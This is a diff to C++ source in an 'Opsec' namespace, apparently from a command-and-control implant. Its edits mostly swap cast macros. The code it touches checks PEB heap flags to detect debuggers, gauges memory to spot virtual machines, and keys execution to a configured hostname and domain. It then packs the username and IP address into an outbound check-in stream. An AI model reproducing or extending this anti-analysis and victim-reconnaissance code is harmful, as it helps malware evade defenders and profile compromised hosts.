@@ -64,12 +64,12 @@ namespace Opsec {
         HeapFlagsOffset 		= VistaOrGreater ? 0x40 : 0x0C;
         HeapForceFlagsOffset 	= VistaOrGreater ? 0x44 : 0x10;
 #else
-        pHeapBase               = C_PTR(*UL_PPTR(B_PTR(pPeb) + 0x30));
+        pHeapBase               = C_PTR(*CREINTERPRET(ULONG_PTR*, CREINTERPRET(PBYTE, pPeb) + 0x30));
         HeapFlagsOffset         = VistaOrGreater ? 0x70 : 0x14;
         HeapForceFlagsOffset    = VistaOrGreater ? 0x74 : 0x18;
 #endif
-        auto HeapFlags          = UL_PPTR(B_PTR(pHeapBase) + HeapFlagsOffset);
-        auto HeapForceFlags     = UL_PPTR(B_PTR(pHeapBase) + HeapForceFlagsOffset);
+        auto HeapFlags          = CREINTERPRET(ULONG_PTR*, CREINTERPRET(PBYTE, pHeapBase) + HeapFlagsOffset);
+        auto HeapForceFlags     = CREINTERPRET(ULONG_PTR*, CREINTERPRET(PBYTE, pHeapBase) + HeapForceFlagsOffset);
 
         ((*HeapFlags & ~HEAP_GROWABLE) || (*HeapForceFlags != 0))
             ? ntstatus = (ERROR_DEVICE_ALREADY_ATTACHED)
@@ -80,7 +80,7 @@ namespace Opsec {
         // check ACPI tables for vm vendors instead of just checking memory
         HEXANE
 
-        MEMORYSTATUSEX stats = {};
+        MEMORYSTATUSEX stats = { };
         stats.dwLength = sizeof(stats);
 
         Ctx->win32.GlobalMemoryStatusEx(&stats);
@@ -95,7 +95,7 @@ namespace Opsec {
 
         PSTREAM Outbound            = Stream::CreateStreamWithHeaders(TypeCheckin);
         PIP_ADAPTER_INFO adapter    = { };
-        PCHAR buffer                = { };
+        LPSTR buffer                = { };
         ULONG length                = 0;
 
         if (!Outbound) {
@@ -103,7 +103,7 @@ namespace Opsec {
         }
 
         if (!Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, buffer, &length)) {
-            buffer = PCHAR_CAST(Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
+            buffer = CREINTERPRET(LPSTR, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
 
             if (Ctx->win32.GetComputerNameExA(ComputerNameNetBIOS, buffer, &length)) {
                 if (Utils::GetHashFromStringA(Ctx->Config.Hostname, x_strlen(Ctx->Config.Hostname)) != Utils::GetHashFromStringA(buffer, x_strlen(buffer))) {
@@ -121,7 +121,7 @@ namespace Opsec {
         length = 0;
         if (Ctx->Config.Domain[0] != NULTERM) {
             if (!Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, buffer, &length)) {
-                buffer = PCHAR_CAST(Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
+                buffer = CREINTERPRET(LPSTR, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
 
                 if (Ctx->win32.GetComputerNameExA(ComputerNameDnsDomain, buffer, &length)) {
                     if (Utils::GetHashFromStringA(Ctx->Config.Domain, x_strlen(Ctx->Config.Domain)) != Utils::GetHashFromStringA(buffer, x_strlen(buffer))) {
@@ -141,7 +141,7 @@ namespace Opsec {
 
         length = 0;
         if (!Ctx->win32.GetUserNameA(buffer, &length)) {
-            buffer = PCHAR_CAST(Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
+            buffer = CREINTERPRET(LPSTR, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
 
             if (Ctx->win32.GetUserNameA(buffer, &length)) {
                 Stream::PackString(Outbound, buffer);
@@ -154,7 +154,7 @@ namespace Opsec {
 
         length = 0;
         if (Ctx->win32.GetAdaptersInfo(adapter, &length)) {
-            adapter = ADAPTER_CAST(Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
+            adapter = CREINTERPRET(PIP_ADAPTER_INFO, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, length));
 
             if (Ctx->win32.GetAdaptersInfo(adapter, &length) == NO_ERROR) {
                 Stream::PackString(Outbound, adapter->IpAddressList.IpAddress.String);
